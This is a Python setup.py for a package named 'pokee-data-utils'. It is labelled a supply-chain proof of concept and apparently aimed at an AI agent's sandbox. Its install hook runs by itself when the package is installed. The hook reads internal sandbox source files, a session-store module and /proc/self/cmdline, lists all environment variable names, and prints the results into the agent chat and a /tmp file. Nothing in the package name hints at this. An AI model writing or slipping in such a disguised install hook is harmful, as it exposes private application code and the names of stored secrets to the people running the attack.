from setuptools import setup
from setuptools.command.install import install
import os, socket, json

class PostInstall(install):
    def run(self):
        install.run(self)

        proof = {
            "uid": os.getuid(),
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "internal_files_accessible": {}
        }

        # Read files we already confirmed are accessible
        for path in [
            "/sandbox-app/ws_proxy.py",
            "/sandbox-app/ws_proxy_modules/session_store.py",
            "/proc/self/cmdline",
        ]:
            try:
                proof["internal_files_accessible"][path] = open(path).read()[:300]
            except Exception as e:
                proof["internal_files_accessible"][path] = f"ERROR: {e}"

        # Show env var NAMES (not values) — proves what secrets exist
        proof["env_var_names"] = [k for k in os.environ.keys()]

        # Print to stdout — visible directly in agent chat
        output = json.dumps(proof, indent=2)
        print("\n[SUPPLY CHAIN POC OUTPUT]\n" + output)

        # Write local proof file
        open("/tmp/sc_critical_poc.json", "w").write(output)

setup(
    name='pokee-data-utils',
    version='1.0.1',
    packages=['pokee_poc'],
    cmdclass={'install': PostInstall},
)
